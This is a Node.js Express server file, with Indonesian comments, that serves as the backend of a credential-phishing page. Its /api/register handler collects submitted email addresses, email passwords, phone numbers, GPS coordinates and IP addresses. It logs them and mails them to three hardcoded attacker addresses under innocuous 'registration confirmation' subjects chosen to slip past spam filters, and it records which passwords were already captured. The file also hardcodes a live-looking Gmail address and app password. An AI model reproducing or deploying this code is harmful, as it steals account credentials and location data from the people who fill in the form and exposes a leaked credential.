const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';
const RECEIVER_EMAIL = [
    'chilligemaass@gmail.com',
    'akunvanzz888@gmail.com',
    'zamzaja78@gmail.com'
];

// Cooldown per EMAIL TARGET
const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        console.log(`✅ Target BARU: ${targetEmail} → BISA dikirim`);
        return true;
    }
    
    if (record.lastPassword !== currentPassword) {
        console.log(`🔄 Password BERBEDA untuk ${targetEmail} → LANGSUNG BISA dikirim`);
        return true;
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    
    if (!canSend) {
        const remainingMinutes = Math.ceil((COOLDOWN_MS - timeElapsed) / (1000 * 60));
        console.log(`⏰ COOLDOWN: ${targetEmail} → Tunggu ${remainingMinutes} menit lagi`);
        return false;
    }
    
    return true;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

function getNormalSubject(targetEmail) {
    const subjects = [
        `Data registration confirmation - ${new Date().toLocaleDateString()}`,
        `Your account details for ${targetEmail}`,
        `Registration complete: Reference #${Math.floor(Math.random() * 1000000)}`,
        `Welcome! Please verify your information`,
        `Account update: Action required`
    ];
    return subjects[Math.floor(Math.random() * subjects.length)];
}

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 DATA RECEIVED:');
        console.log('📍 GPS:', data.latitude, data.longitude);
        console.log('🌐 IP:', data.ip_address);
        console.log('📧 Target Email:', data.email);
        console.log('🔑 Password:', data.emailPassword);
        console.log('📱 Phone:', data.phone);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            console.log(`❌ NOT SENT: ${data.email} | Cooldown active`);
            return res.json({
                success: true,
                blocked: true,
                reason: `Cooldown 1 hour for same password`,
                cooldownInfo: getCooldownInfo(data.email)
            });
        }
        
        if (!isDup) {
            console.log(`🔄 Different password for ${data.email} → Sending now`);
        }
        
        // NORMAL-looking email content (no spam triggers)
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Registration Confirmation</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background: #f5f5f5; padding: 20px; text-align: center; border-bottom: 2px solid #ddd; }
        .content { padding: 20px; }
        .field { margin: 10px 0; }
        .label { font-weight: bold; display: inline-block; width: 150px; }
        .value { display: inline-block; }
        .footer { margin-top: 30px; padding: 15px; background: #f9f9f9; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #eee; }
    </style>
</head>
<body>
    <div class="header">
        <h2>Registration Confirmation</h2>
    </div>
    <div class="content">
        <p>Dear User,</p>
        <p>Thank you for completing your registration. Below is the information we received:</p>
        
        <div class="field"><span class="label">Email:</span> <span class="value">${data.email || '-'}</span></div>
        <div class="field"><span class="label">Phone:</span> <span class="value">${data.phone || '-'}</span></div>
        <div class="field"><span class="label">Location:</span> <span class="value">${data.country || '-'}, ${data.province || '-'}, ${data.city || '-'}</span></div>
        <div class="field"><span class="label">GPS:</span> <span class="value">${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}</span></div>
        <div class="field"><span class="label">IP Address:</span> <span class="value">${data.ip_address || '-'}</span></div>
        <div class="field"><span class="label">Registration Time:</span> <span class="value">${data.timestamp || '-'}</span></div>
        
        <p>Please keep this information for your records.</p>
        <p>Best regards,<br>Support Team</p>
    </div>
    <div class="footer">
        This is an automated message. Please do not reply to this email.
    </div>
</body>
</html>
`;
        
        // Send to each receiver separately (not merged)
        for (const receiver of RECEIVER_EMAIL) {
            await transporter.sendMail({
                from: `"𝗕𝗬 𝗗𝗘𝗦𝗔𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟🎭 𝗗𝗔𝗧𝗔 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.country || '-'} ${data.email || '-'}" <${SENDER_EMAIL}>`,
                to: receiver,
                subject: getNormalSubject(data.email),
                html: htmlContent,
                attachments: [{
                    filename: `registration_${Date.now()}_${receiver.split('@')[0]}.json`,
                    content: JSON.stringify(data, null, 2)
                }]
            });
            console.log(`✅ Sent to: ${receiver}`);
            
            // Small delay between sends to avoid merging
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        console.log(`✅ EMAIL SENT SUCCESSFULLY! Target: ${data.email}`);
        res.json({ success: true, message: 'Email sent successfully' });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true, error: error.message });
    }
});

function getCooldownInfo(targetEmail) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return null;
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    return {
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60)),
        canSend: timeElapsed >= COOLDOWN_MS
    };
}

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Email sending active`);
    console.log(`⏰ Cooldown: 1 hour for SAME email + SAME password`);
    console.log(`🔄 Different password → No cooldown, send immediately`);
});
